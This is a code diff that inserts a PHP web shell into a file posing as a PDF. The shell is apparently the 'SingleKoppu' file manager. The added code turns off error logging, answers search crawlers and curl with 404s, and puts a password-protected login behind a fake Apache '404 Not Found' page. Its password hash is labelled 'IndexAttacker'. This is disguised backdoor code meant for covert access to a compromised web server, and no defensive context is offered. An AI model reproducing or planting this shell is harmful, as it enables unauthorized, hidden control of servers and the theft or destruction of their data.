@@ -1,6 +1,70 @@
 %PDF-1.4
 %����
 1 0 obj<?php
+header("X-XSS-Protection: 0");
+session_start();
+ob_start();
+set_time_limit(0);
+error_reporting(0);
+@clearstatcache();
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+
+if (version_compare(PHP_VERSION, '5.3.0', '<')) {
+	@set_magic_quotes_runtime(0);
+}
+if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
+	if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+		header('HTTP/1.0 404 Not Found');
+		exit;
+	}
+}
+
+$password = "4a059aa73ede74edb46e462117887c74"; // md5 : IndexAttacker
+
+function login_shell()
+{
+?>
+	<!DOCTYPE HTML>
+	<html>
+
+	<head>
+		<title>404 Not Found</title>
+		<h1>Not Found</h1>
+
+		<p>The requested URL was not found on this server.</p>
+		<p>Additionally, a 404 Not Found
+			error was encountered while trying to use an ErrorDocument to handle the request.</p>
+		<hr>
+		<address>Apache Server at <?= $_SERVER['HTTP_HOST'] ?> Port 80</address>
+		<style>
+			input {
+				margin: 0;
+				background-color: #fff;
+				border: 1px solid #fff;
+				text-align: center;
+			}
+		</style>
+		<br><br><br><br><br>
+		<form method="post">
+			<center>
+				<input type="password" name="password" autocomplete="off">
+		</form>
+		</center>
+	<?php
+	exit;
+}
+
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+	if (empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
+		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+	else
+		login_shell();
+  
 /*-----------@
 SingleKoppu v1.0 (file manager)
 Provided by Mini Super Files
